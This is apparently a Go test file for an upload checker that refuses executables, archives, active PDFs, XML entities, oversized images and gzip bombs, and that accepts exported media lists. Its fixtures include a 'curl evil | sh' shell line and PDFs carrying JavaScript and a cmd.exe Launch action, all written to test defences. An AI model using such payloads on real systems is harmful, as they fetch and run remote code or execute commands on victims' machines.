package upload

import (
	"aaru-go-api/internal/apperr"
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"errors"
	"hash/crc32"
	"image"
	"image/color"
	"image/jpeg"
	"image/png"
	"strings"
	"testing"
)

var chat = Door{Accept: []Kind{KindImage, KindPDF, KindText}, MaxText: 5 << 20, Gzip: true}

func tinyPNG(t *testing.T) []byte {
	t.Helper()
	img := image.NewRGBA(image.Rect(0, 0, 2, 2))
	img.Set(0, 0, color.White)
	var b bytes.Buffer
	if err := png.Encode(&b, img); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// hugePNG is a PNG whose header declares width × height; only the header is valid.
func hugePNG(width, height uint32) []byte {
	var b bytes.Buffer
	b.WriteString("\x89PNG\r\n\x1a\n")
	ihdr := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdr[0:4], width)
	binary.BigEndian.PutUint32(ihdr[4:8], height)
	ihdr[8], ihdr[9] = 8, 6 // 8-bit RGBA
	chunk := append([]byte("IHDR"), ihdr...)
	_ = binary.Write(&b, binary.BigEndian, uint32(13))
	b.Write(chunk)
	_ = binary.Write(&b, binary.BigEndian, crc32.ChecksumIEEE(chunk))
	return b.Bytes()
}

func gz(t *testing.T, data []byte) []byte {
	t.Helper()
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

func pdf(body string) []byte {
	return []byte("%PDF-1.7\n" + body + "\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n")
}

func refusedWith(t *testing.T, err, want error) {
	t.Helper()
	if err == nil {
		t.Fatal("accepted, want a refusal")
	}
	if want != nil && !errors.Is(err, want) {
		var got, wanted *apperr.Error
		if errors.As(err, &got) && errors.As(want, &wanted) {
			t.Fatalf("refused with %q, want %q", got.Message, wanted.Message)
		}
		t.Fatalf("refused with %v, want %v", err, want)
	}
}

func TestCheckRefuses(t *testing.T) {
	cases := []struct {
		name, file, declared string
		data                 []byte
		want                 error
	}{
		{"empty", "list.csv", "text/csv", nil, errEmpty},
		{"exe renamed to csv", "list.csv", "text/csv", append([]byte("MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"), make([]byte, 64)...), errExecutable},
		{"elf", "list.txt", "", []byte("\x7fELF\x02\x01\x01\x00rest"), errExecutable},
		{"mach-o", "notes.md", "", []byte{0xCF, 0xFA, 0xED, 0xFE, 7, 0, 0, 1}, errExecutable},
		{"shell script", "list.txt", "text/plain", []byte("#!/bin/sh\ncurl evil | sh\n"), errExecutable},
		{"zip as csv", "list.csv", "text/csv", []byte("PK\x03\x04\x14\x00\x00\x00rest"), errArchive},
		{"zip after a BOM", "list.csv", "text/csv", []byte("\xEF\xBB\xBFPK\x03\x04rest"), errArchive},
		{"7z", "list.csv", "", []byte("7z\xBC\xAF\x27\x1Crest"), errArchive},
		{"rar", "list.csv", "", []byte("Rar!\x1A\x07\x00rest"), errArchive},
		{"legacy xls", "list.csv", "", []byte{0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1, 0, 0}, errOffice},
		{"rtf", "list.txt", "", []byte(`{\rtf1\ansi hello}`), errOffice},
		{"heic", "photo.jpg", "image/jpeg", []byte("\x00\x00\x00\x18ftypheic\x00\x00\x00\x00"), errHEIC},
		{"huge png", "shot.png", "image/png", hugePNG(100_000, 100_000), errHugeImage},
		{"broken png", "shot.png", "image/png", []byte("\x89PNG\r\n\x1a\nnope"), errPicture},
		{"jpeg labelled png", "shot.png", "image/png", jpegHeader(), errMismatch},
		{"png named pdf", "doc.pdf", "", nil, errMismatch}, // data set below
		{"pdf with javascript", "list.pdf", "application/pdf", pdf("1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj"), errPDFActive},
		{"pdf with hex-escaped javascript", "list.pdf", "", pdf("1 0 obj << /S /J#61vaScript >> endobj"), errPDFActive},
		{"pdf with launch", "list.pdf", "", pdf("<< /S /Launch /F (cmd.exe) >>"), errPDFActive},
		{"pdf with embedded file", "list.pdf", "", pdf("<< /Type /EmbeddedFile >>"), errPDFActive},
		{"encrypted pdf", "list.pdf", "", pdf("trailer << /Encrypt 5 0 R >>"), errPDFLocked},
		{"pdf without end", "list.pdf", "", []byte("%PDF-1.7\n1 0 obj << >> endobj\n"), errPDFBroken},
		{"pdf of too many pages", "list.pdf", "", pdf(strings.Repeat("<< /Type /Page >>\n", MaxPDFPages+1)), errPDFPages},
		{"xml with an entity", "animelist.xml", "application/xml", []byte(`<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]><myanimelist>&a;</myanimelist>`), errEntities},
		{"binary noise", "list.csv", "", binaryNoise(), errBinary},
		{"nul in text", "list.csv", "", []byte("Title,Year\nDune\x00,2021\n"), errBinary},
		{"json named csv-less xml", "list.xml", "", []byte(`{"a":1}`), errMismatch},
		{"csv declared as pdf", "list.csv", "application/pdf", []byte("Title,Year\nDune,2021\n"), errMismatch},
		{"gzip of a zip", "animelist.xml.gz", "", nil, errGzipNested}, // data set below
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			data := tc.data
			switch tc.name {
			case "png named pdf":
				data = tinyPNG(t)
			case "gzip of a zip":
				data = gz(t, []byte("PK\x03\x04\x14\x00rest"))
			}
			_, err := Check(tc.file, tc.declared, data, chat)
			refusedWith(t, err, tc.want)
		})
	}
}

var jpegBytes = func() []byte {
	var b bytes.Buffer
	if err := jpeg.Encode(&b, image.NewGray(image.Rect(0, 0, 16, 16)), nil); err != nil {
		panic(err)
	}
	return b.Bytes()
}()

func jpegHeader() []byte { return jpegBytes }

func binaryNoise() []byte {
	b := make([]byte, 2048)
	x := uint32(2463534242)
	for i := range b {
		x ^= x << 13
		x ^= x >> 17
		x ^= x << 5
		b[i] = byte(x) | 0x80 // never ASCII, rarely valid UTF-8
	}
	return b
}

func TestCheckGzipBomb(t *testing.T) {
	bomb := gz(t, bytes.Repeat([]byte("a,b\n"), 2<<20)) // 8 MB of text, a few KB packed
	_, err := Check("animelist.xml.gz", "", bomb, Door{Accept: []Kind{KindText}, MaxText: 5 << 20, Gzip: true})
	refusedWith(t, err, errTooLarge)
}

func TestCheckGzipOnlyWhereAllowed(t *testing.T) {
	_, err := Check("animelist.xml.gz", "", gz(t, []byte("<myanimelist></myanimelist>")), Door{Accept: []Kind{KindText}, MaxText: 1 << 20})
	refusedWith(t, err, errArchive)
}

func TestCheckDoorRefusesOtherKinds(t *testing.T) {
	exports := Door{Accept: []Kind{KindText}, MaxText: 5 << 20}
	_, err := Check("shot.png", "image/png", tinyPNG(t), exports)
	refusedWith(t, err, errBinary)
}

func TestCheckTextTooLarge(t *testing.T) {
	_, err := Check("list.csv", "text/csv", bytes.Repeat([]byte("x"), 101), Door{Accept: []Kind{KindText}, MaxText: 100})
	refusedWith(t, err, errTooLarge)
}

func TestCheckAccepts(t *testing.T) {
	cases := []struct {
		name, file, declared string
		data                 []byte
		kind                 Kind
		format               Format
		mediaType            string
	}{
		{"letterboxd csv", "watched.csv", "text/csv", []byte("Date,Name,Year,Letterboxd URI\n2024-01-01,Dune,2021,https://boxd.it/x\n"), KindText, FormatPlain, "text/plain"},
		{"csv with BOM", "ratings.csv", "text/csv", []byte("\xEF\xBB\xBFConst,Title Type\ntt1,movie\n"), KindText, FormatPlain, "text/plain"},
		{"latin-1 csv", "goodreads.csv", "", []byte("Title,Author\nL'\xe9tranger,Camus\n"), KindText, FormatPlain, "text/plain"},
		{"mal xml", "animelist.xml", "application/xml", []byte(`<?xml version="1.0" encoding="UTF-8"?><myanimelist><anime></anime></myanimelist>`), KindText, FormatXML, "application/xml"},
		{"ics", "cat.ics", "text/calendar", []byte("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nEND:VCALENDAR\r\n"), KindText, FormatCalendar, "text/calendar"},
		{"spotify json", "Streaming_History_Audio_2024.json", "application/json", []byte(`[{"ts":"2024-01-01T00:00:00Z","ms_played":1}]`), KindText, FormatJSON, "application/json"},
		{"markdown", "list.md", "", []byte("# Films to watch\n\n- Dune\n- Arrival\n"), KindText, FormatPlain, "text/plain"},
		{"paste with no name", "", "text/plain", []byte("Here are 10 great sci-fi films:\n1. Dune (2021)\n"), KindText, FormatPlain, "text/plain"},
		{"text starting MZ", "notes.txt", "", []byte("MZ Wallace bag, Dune, Arrival\n"), KindText, FormatPlain, "text/plain"},
		{"pdf", "list.pdf", "application/pdf", pdf("1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] >> endobj\n3 0 obj << /Type /Page >> endobj"), KindPDF, "", "application/pdf"},
		{"jpeg", "shot.jpg", "image/jpeg", jpegHeader(), KindImage, "", "image/jpeg"},
		{"jpeg with no name", "", "application/octet-stream", jpegHeader(), KindImage, "", "image/jpeg"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f, err := Check(tc.file, tc.declared, tc.data, chat)
			if err != nil {
				t.Fatalf("refused: %v", err)
			}
			if f.Kind != tc.kind || f.Format != tc.format || f.MediaType != tc.mediaType {
				t.Fatalf("got %s/%s/%s, want %s/%s/%s", f.Kind, f.Format, f.MediaType, tc.kind, tc.format, tc.mediaType)
			}
		})
	}
}

func TestCheckPNG(t *testing.T) {
	f, err := Check("shot.png", "image/png", tinyPNG(t), chat)
	if err != nil || f.Kind != KindImage || f.MediaType != "image/png" {
		t.Fatalf("got %+v, %v", f, err)
	}
}

func TestCheckGzipUnpacks(t *testing.T) {
	xml := []byte(`<?xml version="1.0"?><myanimelist></myanimelist>`)
	f, err := Check("animelist.xml.gz", "application/gzip", gz(t, xml), chat)
	if err != nil {
		t.Fatalf("refused: %v", err)
	}
	if f.Format != FormatXML || f.Text != string(xml) {
		t.Fatalf("got %+v", f)
	}
}

func TestCheckUTF16(t *testing.T) {
	data := []byte{0xFF, 0xFE}
	for _, r := range "Title,Year\nDune,2021\n" {
		data = append(data, byte(r), 0)
	}
	f, err := Check("list.csv", "text/csv", data, chat)
	if err != nil {
		t.Fatalf("refused: %v", err)
	}
	if f.Text != "Title,Year\nDune,2021\n" {
		t.Fatalf("got %q", f.Text)
	}
}

func TestWebPSize(t *testing.T) {
	lossless := []byte("RIFF\x00\x00\x00\x00WEBPVP8L\x00\x00\x00\x00\x2f")
	// 14 bits width-1 = 99, 14 bits height-1 = 49.
	bits := uint32(99) | uint32(49)<<14
	lossless = binary.LittleEndian.AppendUint32(lossless, bits)
	lossless = append(lossless, make([]byte, 16)...)
	w, h, ok := webpSize(lossless)
	if !ok || w != 100 || h != 50 {
		t.Fatalf("got %d×%d %v", w, h, ok)
	}
	extended := []byte("RIFF\x00\x00\x00\x00WEBPVP8X\x0a\x00\x00\x00\x00\x00\x00\x00")
	extended = append(extended, 0x0F, 0x27, 0x00, 0x0F, 0x27, 0x00) // 9999+1 each side
	extended = append(extended, make([]byte, 8)...)
	_, err := Check("big.webp", "image/webp", extended, chat)
	refusedWith(t, err, errHugeImage)
}

func FuzzCheck(f *testing.F) {
	f.Add("list.csv", "text/csv", []byte("Title,Year\nDune,2021\n"))
	f.Add("list.pdf", "application/pdf", pdf("<< /Type /Page >>"))
	f.Add("a.xml.gz", "", []byte{0x1F, 0x8B, 0x08, 0x00})
	f.Add("shot.png", "image/png", hugePNG(10, 10))
	f.Add("x.webp", "", []byte("RIFF\x00\x00\x00\x00WEBPVP8 \x00\x00\x00\x00\x00\x00\x00\x9d\x01\x2a\x10\x00\x10\x00"))
	f.Add("u.csv", "", []byte{0xFE, 0xFF, 0x00, 'a'})
	f.Fuzz(func(t *testing.T, name, declared string, data []byte) {
		file, err := Check(name, declared, data, chat)
		if err != nil {
			return
		}
		if len(file.Data) == 0 {
			t.Fatal("accepted with no bytes")
		}
		if file.Kind == KindText && file.Text != string(file.Data) {
			t.Fatal("text and bytes differ")
		}
		if file.Kind == KindText && strings.ContainsRune(file.Text, 0) {
			t.Fatal("text with a NUL")
		}
	})
}
